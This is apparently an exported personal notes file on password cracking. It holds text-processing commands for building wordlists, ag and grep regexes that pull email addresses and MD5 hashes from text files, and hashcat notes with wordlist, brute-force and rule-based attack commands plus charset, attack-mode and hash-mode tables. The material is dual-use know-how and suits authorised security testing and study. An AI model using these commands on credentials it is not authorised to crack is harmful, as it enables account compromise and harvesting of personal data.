</rich_text>
            <rich_text scale="h2">Generate length based wordlists with awk</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># awk 'length == 10' file.txt &gt; 10-length.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Merge two different txt files</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># paste -d' ' file1.txt file2.txt &gt; new-file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Faster sorting</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># export alias sort='sort --parallel=&lt;number_of_cpu_cores&gt; -S &lt;amount_of_memory&gt;G ' &amp;&amp; export LC_ALL='C' &amp;&amp; cat file.txt | sort -u &gt; new-file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Mac to unix</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># tr '\015' '\012' &lt; in_file &gt; out_file</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Dos to Unix</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># dos2unix file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Unix to Dos</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># unix2dos file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Remove from one file what is in another file</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># grep -F -v -f file1.txt -w file2.txt &gt; file3.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Isolate specific line numbers with sed</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># sed -n '1,100p' test.file &gt; file.out</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Create Wordlists from PDF files</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># pdftotext file.pdf file.txt</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Find the line number of a string inside a file</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace" scale="h3"># awk '{ print NR, $0 }' file.txt | grep "string-to-grep"</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="Silver searcher" unique_id="318" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724178956" ts_lastsave="1724179045">
            <rich_text scale="h1">Faster filtering with the silver searcher</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">https://github.com/ggreer/the_silver_searcher</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">For faster searching, use all the above grep regular expressions with the command ag. The following is a proof of concept of its speed:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace"># time ack-grep -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt &gt; /dev/null 
real    1m2.447s
user    1m2.297s
sys 0m0.645s

# time egrep -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt &gt; /dev/null 
real    0m30.484s
user    0m30.292s
sys 0m0.310s

# time ag -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt &gt; /dev/null 
real    0m4.908s
user    0m4.820s
sys 0m0.277s</rich_text>
          </node>
          <node name="Useful use of Cat" unique_id="319" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724178996" ts_lastsave="1724179055">
            <rich_text scale="h2">Useful Use of Cat</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">Contrary to what many veteran unix users may believe, this happens to be one of the rare opportunities where using cat can actually make your searches </rich_text>
            <rich_text style="italic" scale="h3">faster</rich_text>
            <rich_text scale="h3">. The SilverSearcher utility is (at the time of this writing) not quite as efficient as cat when it comes to reading from file handles. Therefore, you can pipe output from </rich_text>
            <rich_text scale="h3" weight="heavy">cat</rich_text>
            <rich_text scale="h3"> into </rich_text>
            <rich_text scale="h3" weight="heavy">ag</rich_text>
            <rich_text scale="h3"> to see nearly a 2x real time performance gain:</rich_text>
            <rich_text>
</rich_text>
            <rich_text family="monospace">$ time ag -o '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | ag -o '[a-fA-F0-9]{32}' &gt; /dev/null

real    0m10.851s 
user    0m13.069s
sys 0m0.092s

$ time cat *.txt | ag -o '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' | ag -o '[a-fA-F0-9]{32}' &gt; /dev/null

real    0m6.689s
user    0m7.881s 
sys 0m0.424s  </rich_text>
          </node>
        </node>
        <node name="Documentation" unique_id="315" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724178595" ts_lastsave="1724179546">
          <rich_text scale="h1" weight="heavy"># Hashcat</rich_text>
          <rich_text>

Website (Origin source)
</rich_text>
          <rich_text link="webs https://hashcat.net/wiki/">https://hashcat.net/wiki/</rich_text>
        </node>
        <node name="example" unique_id="260" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154644" ts_lastsave="1687592940">
          <rich_text>$ hashcat -a 0 -m 500 -o ./cracked.txt ./key.hash ./wordlist.txt
$ hashcat -a 3 -m 0 key.hash
$ hashcat -a 3 -m 0 key.hash ?d?d?d?d?d?d?d?d</rich_text>
          <node name="Bruteforce" unique_id="272" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687155636" ts_lastsave="1687593282">
            <rich_text scale="h1" weight="heavy">Bruteforce Attack</rich_text>
            <node name="easy explane" unique_id="273" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687156821" ts_lastsave="1687157505">
              <rich_text weight="heavy">$ hashcat </rich_text>
              <rich_text foreground="#5757e3e38989" weight="heavy">-a 3</rich_text>
              <rich_text weight="heavy"> </rich_text>
              <rich_text foreground="#ffff78780000" weight="heavy">-m 0</rich_text>
              <rich_text weight="heavy"> key.hash</rich_text>
              <rich_text>

### hashcat options:
</rich_text>
              <rich_text foreground="#2e2ec2c27e7e">-a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3</rich_text>
              <rich_text>
</rich_text>
              <rich_text foreground="#e6e661610000">-m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000</rich_text>
              <rich_text>

</rich_text>
              <rich_text foreground="#5757e3e38989" weight="heavy">- [ Attack Modes ] -</rich_text>
              <rich_text foreground="#5757e3e38989">

  # | Mode
 ===+======
  0 | Straight
  1 | Combination
</rich_text>
              <rich_text underline="single" foreground="#5757e3e38989" weight="heavy">  3 | Brute-force</rich_text>
              <rich_text foreground="#5757e3e38989">
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association</rich_text>
              <rich_text>
  
</rich_text>
              <rich_text foreground="#ffff78780000" weight="heavy">- [ Hash modes ] -</rich_text>
              <rich_text foreground="#ffff78780000">

 #     | Name                                                                             | Category
===+=================================+===============================
500  | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                | Operating System</rich_text>
            </node>
            <node name="more" unique_id="280" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687593282" ts_lastsave="1687593480">
              <rich_text weight="heavy">$ hashcat </rich_text>
              <rich_text foreground="#5757e3e38989" weight="heavy">-a 3</rich_text>
              <rich_text weight="heavy"> </rich_text>
              <rich_text foreground="#ffff78780000" weight="heavy">-m 0</rich_text>
              <rich_text weight="heavy"> key.hash</rich_text>
              <rich_text> </rich_text>
              <rich_text foreground="#f5f5c2c21111" weight="heavy">?u?l?l?l?l?l?l?a?a?a</rich_text>
              <rich_text>

### hashcat options:
</rich_text>
              <rich_text foreground="#2e2ec2c27e7e">-a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3</rich_text>
              <rich_text>
</rich_text>
              <rich_text foreground="#e6e661610000">-m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000</rich_text>
              <rich_text>

</rich_text>
              <rich_text foreground="#5757e3e38989" weight="heavy">- [ Attack Modes ] -</rich_text>
              <rich_text foreground="#5757e3e38989">

  # | Mode
 ===+======
  0 | Straight
  1 | Combination
</rich_text>
              <rich_text underline="single" foreground="#5757e3e38989" weight="heavy">  3 | Brute-force</rich_text>
              <rich_text foreground="#5757e3e38989">
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association</rich_text>
              <rich_text>
  
</rich_text>
              <rich_text foreground="#ffff78780000" weight="heavy">- [ Hash modes ] -</rich_text>
              <rich_text foreground="#ffff78780000">

 #     | Name                                                                             | Category
===+=================================+===============================
500  | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                | Operating System</rich_text>
              <rich_text>

</rich_text>
              <rich_text foreground="#f5f5c2c21111" weight="heavy">- [ Built-in Charsets ] -</rich_text>
              <rich_text foreground="#f5f5c2c21111">
- 
  ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz				[a-z]
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ		[A-Z]
  d | 0123456789										[0-9]
  h | 0123456789abcdef								[0-9a-f]
  H | 0123456789ABCDEF							[0-9A-F]
  s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff</rich_text>
            </node>
          </node>
          <node name="Wordlist" unique_id="271" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687155566" ts_lastsave="1687155571">
            <rich_text scale="h1" weight="heavy">Wordlist Attack</rich_text>
            <rich_text>

### create Hashed Password For Linux/Unix

</rich_text>
            <rich_text weight="heavy">$ mkpasswd -m md5 myPassword</rich_text>
            <rich_text>
$1$UxZQk.VH$Jkh7L16HcCtTfaaoCbRp90

### It's Unix Operation MD5 Hash Type
### hashcat Hash models:
### 500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System

### hashcat options:
-a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3
-m, --hash-type                | Num  | Hash-type, references below (otherwise autodetect)   | -m 1000
-o, --outfile                  | File | Define outfile for recovered hash                    | -o outfile.txt

### RUN:
</rich_text>
            <rich_text weight="heavy">$ hashcat -a 0 -m 500 -o ./cracked.txt ./key.hash ./wordlist.txt</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="wordlist with rules" unique_id="279" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687592940" ts_lastsave="1687593099">
            <rich_text scale="h1" weight="heavy">Wordlist Attack</rich_text>
            <rich_text> with rules

</rich_text>
            <rich_text weight="heavy">$ hashcat </rich_text>
            <rich_text foreground="#2e2ec2c27e7e" weight="heavy">-a 0</rich_text>
            <rich_text weight="heavy"> </rich_text>
            <rich_text foreground="#ffffa3a34848" weight="heavy">-m 500</rich_text>
            <rich_text weight="heavy"> </rich_text>
            <rich_text foreground="#c0c01c1c2828" weight="heavy">-r ./best64.rule</rich_text>
            <rich_text weight="heavy"> ./key.hash ./wordlist.txt</rich_text>
          </node>
        </node>
        <node name="help" unique_id="257" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687145266" ts_lastsave="1687323839">
          <rich_text weight="heavy">- [ Built-in Charsets ] -</rich_text>
          <rich_text>
- 
  ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz				[a-z]
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ		[A-Z]
  d | 0123456789										[0-9]
  h | 0123456789abcdef								[0-9a-f]
  H | 0123456789ABCDEF							[0-9A-F]
  s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff


</rich_text>
          <rich_text weight="heavy">- [ Attack Modes ] -</rich_text>
          <rich_text>

  # | Mode
 ===+======
  0 | Straight
  1 | Combination
  3 | Brute-force
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association
  
  
</rich_text>
          <rich_text weight="heavy">- [ Basic Examples ] -</rich_text>
          <rich_text>

  Attack-								| Hash-			|
  Mode									| Type			| Example command
 ==================+=======+=================================================
  Wordlist								| $P$				| hashcat -a 0 -m 400 example400.hash example.dict
  Wordlist + Rules					| MD5			| hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force							| MD5			| hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator							| MD5			| hashcat -a 1 -m 0 example0.hash example.dict example.dict
  Association							| $1$				| hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule
 </rich_text>
          <node name="Attack Modes" unique_id="266" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154958" ts_lastsave="1687154965">
            <rich_text>- [ Attack Modes ] -

  # | Mode
 ===+======
  0 | Straight
  1 | Combination
  3 | Brute-force
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association
</rich_text>
          </node>
          <node name="Basic Examples" unique_id="270" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687155043" ts_lastsave="1687155054">
            <rich_text>- [ Basic Examples ] -

  Attack-          | Hash- |
  Mode             | Type  | Example command
 ==================+=======+==================================================================
  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict
  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule
  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a
  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict
  Association      | $1$   | hashcat -a 9 -m 500 example500.hash 1word.dict -r rules/best64.rule
</rich_text>
          </node>
          <node name="Brain Client Features" unique_id="263" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154868" ts_lastsave="1687154878">
            <rich_text>- [ Brain Client Features ] -

  # | Features
 ===+========
  1 | Send hashed passwords
  2 | Send attack positions
  3 | Send hashed passwords and attack positions
</rich_text>
          </node>
          <node name="Built-in Charsets" unique_id="267" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154976" ts_lastsave="1687154982">
            <rich_text>- [ Built-in Charsets ] -

  ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz [a-z]
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]
  d | 0123456789                 [0-9]
  h | 0123456789abcdef           [0-9a-f]
  H | 0123456789ABCDEF           [0-9A-F]
  s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff</rich_text>
          </node>
          <node name="Hash modes" unique_id="262" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687154836" ts_lastsave="1687155084">
            <rich_text>- [ Hash modes ] -

      # | Name                                                       | Category
  ======+============================================================+===============================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
    100 | SHA1                                                       | Raw Hash
   1300 | SHA2-224                                                   | Raw Hash
   1400 | SHA2-256                                                   | Raw Hash
  10800 | SHA2-384                                                   | Raw Hash
   1700 | SHA2-512                                                   | Raw Hash
  17300 | SHA3-224                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  17500 | SHA3-384                                                   | Raw Hash
  17600 | SHA3-512                                                   | Raw Hash
   6000 | RIPEMD-160                                                 | Raw Hash
    600 | BLAKE2b-512                                                | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                       | Raw Hash
   5100 | Half MD5                                                   | Raw Hash
  17700 | Keccak-224                                                 | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
  17900 | Keccak-384                                                 | Raw Hash
  18000 | Keccak-512                                                 | Raw Hash
   6100 | Whirlpool                                                  | Raw Hash
  10100 | SipHash                                                    | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
    170 | sha1(utf16le($pass))                                       | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  10870 | sha384(utf16le($pass))                                     | Raw Hash
   1770 | sha512(utf16le($pass))                                     | Raw Hash
    610 | BLAKE2b-512($pass.$salt)                                   | Raw Hash salted and/or iterated
    620 | BLAKE2b-512($salt.$pass)                                   | Raw Hash salted and/or iterated
     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
   3800 | md5($salt.$pass.$salt)                                     | Raw Hash salted and/or iterated
   3710 | md5($salt.md5($pass))                                      | Raw Hash salted and/or iterated
   4110 | md5($salt.md5($pass.$salt))                                | Raw Hash salted and/or iterated
   4010 | md5($salt.md5($salt.$pass))                                | Raw Hash salted and/or iterated
  21300 | md5($salt.sha1($salt.$pass))                               | Raw Hash salted and/or iterated
     40 | md5($salt.utf16le($pass))                                  | Raw Hash salted and/or iterated
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3910 | md5(md5($pass).md5($salt))                                 | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
   4410 | md5(sha1($pass).$salt)                                     | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
  21200 | md5(sha1($salt).md5($pass))                                | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
     30 | md5(utf16le($pass).$salt)                                  | Raw Hash salted and/or iterated
    110 | sha1($pass.$salt)                                          | Raw Hash salted and/or iterated
    120 | sha1($salt.$pass)                                          | Raw Hash salted and/or iterated
   4900 | sha1($salt.$pass.$salt)                                    | Raw Hash salted and/or iterated
   4520 | sha1($salt.sha1($pass))                                    | Raw Hash salted and/or iterated
  24300 | sha1($salt.sha1($pass.$salt))                              | Raw Hash salted and/or iterated
    140 | sha1($salt.utf16le($pass))                                 | Raw Hash salted and/or iterated
  19300 | sha1($salt1.$pass.$salt2)                                  | Raw Hash salted and/or iterated
  14400 | sha1(CX)                                                   | Raw Hash salted and/or iterated
   4700 | sha1(md5($pass))                                           | Raw Hash salted and/or iterated
   4710 | sha1(md5($pass).$salt)                                     | Raw Hash salted and/or iterated
  21100 | sha1(md5($pass.$salt))                                     | Raw Hash salted and/or iterated
  18500 | sha1(md5(md5($pass)))                                      | Raw Hash salted and/or iterated
   4500 | sha1(sha1($pass))                                          | Raw Hash salted and/or iterated
   4510 | sha1(sha1($pass).$salt)                                    | Raw Hash salted and/or iterated
   5000 | sha1(sha1($salt.$pass.$salt))                              | Raw Hash salted and/or iterated
    130 | sha1(utf16le($pass).$salt)                                 | Raw Hash salted and/or iterated
   1410 | sha256($pass.$salt)                                        | Raw Hash salted and/or iterated
   1420 | sha256($salt.$pass)                                        | Raw Hash salted and/or iterated
  22300 | sha256($salt.$pass.$salt)                                  | Raw Hash salted and/or iterated
  20720 | sha256($salt.sha256($pass))                                | Raw Hash salted and/or iterated
  21420 | sha256($salt.sha256_bin($pass))                            | Raw Hash salted and/or iterated
   1440 | sha256($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  20710 | sha256(sha256($pass).$salt)                                | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
   1430 | sha256(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
  10810 | sha384($pass.$salt)                                        | Raw Hash salted and/or iterated
  10820 | sha384($salt.$pass)                                        | Raw Hash salted and/or iterated
  10840 | sha384($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
  10830 | sha384(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
   1710 | sha512($pass.$salt)                                        | Raw Hash salted and/or iterated
   1720 | sha512($salt.$pass)                                        | Raw Hash salted and/or iterated
   1740 | sha512($salt.utf16le($pass))                               | Raw Hash salted and/or iterated
   1730 | sha512(utf16le($pass).$salt)                               | Raw Hash salted and/or iterated
     50 | HMAC-MD5 (key = $pass)                                     | Raw Hash authenticated
     60 | HMAC-MD5 (key = $salt)                                     | Raw Hash authenticated
    150 | HMAC-SHA1 (key = $pass)                                    | Raw Hash authenticated
    160 | HMAC-SHA1 (key = $salt)                                    | Raw Hash authenticated
   1450 | HMAC-SHA256 (key = $pass)                                  | Raw Hash authenticated
   1460 | HMAC-SHA256 (key = $salt)                                  | Raw Hash authenticated
   1750 | HMAC-SHA512 (key = $pass)                                  | Raw Hash authenticated
   1760 | HMAC-SHA512 (key = $salt)                                  | Raw Hash authenticated
  11750 | HMAC-Streebog-256 (key = $pass), big-endian                | Raw Hash authenticated
  11760 | HMAC-Streebog-256 (key = $salt), big-endian                | Raw Hash authenticated
  11850 | HMAC-Streebog-512 (key = $pass), big-endian                | Raw Hash authenticated
  11860 | HMAC-Streebog-512 (key = $salt), big-endian                | Raw Hash authenticated
  28700 | Amazon AWS4-HMAC-SHA256                                    | Raw Hash authenticated
  11500 | CRC32                                                      | Raw Checksum
  27900 | CRC32C                                                     | Raw Checksum
  28000 | CRC64Jones                                                 | Raw Checksum
  18700 | Java Object hashCode()                                     | Raw Checksum
  25700 | MurmurHash                                                 | Raw Checksum
  27800 | MurmurHash3                                                | Raw Checksum
  14100 | 3DES (PT = $salt, key = $pass)                             | Raw Cipher, Known-plaintext attack
  14000 | DES (PT = $salt, key = $pass)                              | Raw Cipher, Known-plaintext attack
  26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                | Raw Cipher, Known-plaintext attack
  15400 | ChaCha20                                                   | Raw Cipher, Known-plaintext attack
  14500 | Linux Kernel Crypto API (2.4)                              | Raw Cipher, Known-plaintext attack
  14900 | Skip32 (PT = $salt, key = $pass)                           | Raw Cipher, Known-plaintext attack
  11900 | PBKDF2-HMAC-MD5                                            | Generic KDF
  12000 | PBKDF2-HMAC-SHA1                                           | Generic KDF
  10900 | PBKDF2-HMAC-SHA256                                         | Generic KDF
  12100 | PBKDF2-HMAC-SHA512                                         | Generic KDF
   8900 | scrypt                                                     | Generic KDF
    400 | phpass                                                     | Generic KDF
  16100 | TACACS+                                                    | Network Protocol
  11400 | SIP digest authentication (MD5)                            | Network Protocol
   5300 | IKE-PSK MD5                                                | Network Protocol
   5400 | IKE-PSK SHA1                                               | Network Protocol
  25100 | SNMPv3 HMAC-MD5-96                                         | Network Protocol
  25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                            | Network Protocol
  25200 | SNMPv3 HMAC-SHA1-96                                        | Network Protocol
  26700 | SNMPv3 HMAC-SHA224-128                                     | Network Protocol
  26800 | SNMPv3 HMAC-SHA256-192                                     | Network Protocol
  26900 | SNMPv3 HMAC-SHA384-256                                     | Network Protocol
  27300 | SNMPv3 HMAC-SHA512-384                                     | Network Protocol
   2500 | WPA-EAPOL-PBKDF2                                           | Network Protocol
   2501 | WPA-EAPOL-PMK                                              | Network Protocol
  22000 | WPA-PBKDF2-PMKID+EAPOL                                     | Network Protocol
  22001 | WPA-PMK-PMKID+EAPOL                                        | Network Protocol
  16800 | WPA-PMKID-PBKDF2                                           | Network Protocol
  16801 | WPA-PMKID-PMK                                              | Network Protocol
   7300 | IPMI2 RAKP HMAC-SHA1                                       | Network Protocol
  10200 | CRAM-MD5                                                   | Network Protocol
  16500 | JWT (JSON Web Token)                                       | Network Protocol
  29200 | Radmin3                                                    | Network Protocol
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
  29100 | Flask Session Cookie ($salt.$salt.$pass)                   | Network Protocol
   4800 | iSCSI CHAP authentication, MD5(CHAP)                       | Network Protocol
   8500 | RACF                                                       | Operating System
   6300 | AIX {smd5}                                                 | Operating System
   6700 | AIX {ssha1}                                                | Operating System
   6400 | AIX {ssha256}                                              | Operating System
   6500 | AIX {ssha512}                                              | Operating System
   3000 | LM                                                         | Operating System
  19000 | QNX /etc/shadow (MD5)                                      | Operating System
  19100 | QNX /etc/shadow (SHA256)                                   | Operating System
  19200 | QNX /etc/shadow (SHA512)                                   | Operating System
  15300 | DPAPI masterkey file v1 (context 1 and 2)                  | Operating System
  15310 | DPAPI masterkey file v1 (context 3)                        | Operating System
  15900 | DPAPI masterkey file v2 (context 1 and 2)                  | Operating System
  15910 | DPAPI masterkey file v2 (context 3)                        | Operating System
   7200 | GRUB 2                                                     | Operating System
  12800 | MS-AzureSync PBKDF2-HMAC-SHA256                            | Operating System
  12400 | BSDi Crypt, Extended DES                                   | Operating System
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   5800 | Samsung Android Password/PIN                               | Operating System
  28100 | Windows Hello PIN/Password                                 | Operating System
  13800 | Windows Phone 8+ PIN/password                              | Operating System
   2410 | Cisco-ASA MD5                                              | Operating System
   9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                              | Operating System
   9300 | Cisco-IOS $9$ (scrypt)                                     | Operating System
   5700 | Cisco-IOS type 4 (SHA256)                                  | Operating System
   2400 | Cisco-PIX MD5                                              | Operating System
   8100 | Citrix NetScaler (SHA1)                                    | Operating System
  22200 | Citrix NetScaler (SHA512)                                  | Operating System
   1100 | Domain Cached Credentials (DCC), MS Cache                  | Operating System
   2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2             | Operating System
   7000 | FortiGate (FortiOS)                                        | Operating System
  26300 | FortiGate256 (FortiOS256)                                  | Operating System
    125 | ArubaOS                                                    | Operating System
    501 | Juniper IVE                                                | Operating System
     22 | Juniper NetScreen/SSG (ScreenOS)                           | Operating System
  15100 | Juniper/NetBSD sha1crypt                                   | Operating System
  26500 | iPhone passcode (UID key + System Keybag)                  | Operating System
    122 | macOS v10.4, macOS v10.5, macOS v10.6                      | Operating System
   1722 | macOS v10.7                                                | Operating System
   7100 | macOS v10.8+ (PBKDF2-SHA512)                               | Operating System
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
    500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                  | Operating System
   1500 | descrypt, DES (Unix), Traditional DES                      | Operating System
  29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))    | Operating System
   7400 | sha256crypt $5$, SHA256 (Unix)                             | Operating System
   1800 | sha512crypt $6$, SHA512 (Unix)                             | Operating System
  24600 | SQLCipher                                                  | Database Server
    131 | MSSQL (2000)                                               | Database Server
    132 | MSSQL (2005)                                               | Database Server
   1731 | MSSQL (2012, 2014)                                         | Database Server
  24100 | MongoDB ServerKey SCRAM-SHA-1                              | Database Server
  24200 | MongoDB ServerKey SCRAM-SHA-256                            | Database Server
     12 | PostgreSQL                                                 | Database Server
  11100 | PostgreSQL CRAM (MD5)                                      | Database Server
  28600 | PostgreSQL SCRAM-SHA-256                                   | Database Server
   3100 | Oracle H: Type (Oracle 7+)                                 | Database Server
    112 | Oracle S: Type (Oracle 11+)                                | Database Server
  12300 | Oracle T: Type (Oracle 12+)                                | Database Server
   7401 | MySQL $A$ (sha256crypt)                                    | Database Server
  11200 | MySQL CRAM (SHA1)                                          | Database Server
    200 | MySQL323                                                   | Database Server
    300 | MySQL4.1/MySQL5                                            | Database Server
   8000 | Sybase ASE                                                 | Database Server
   8300 | DNSSEC (NSEC3)                                             | FTP, HTTP, SMTP, LDAP Server
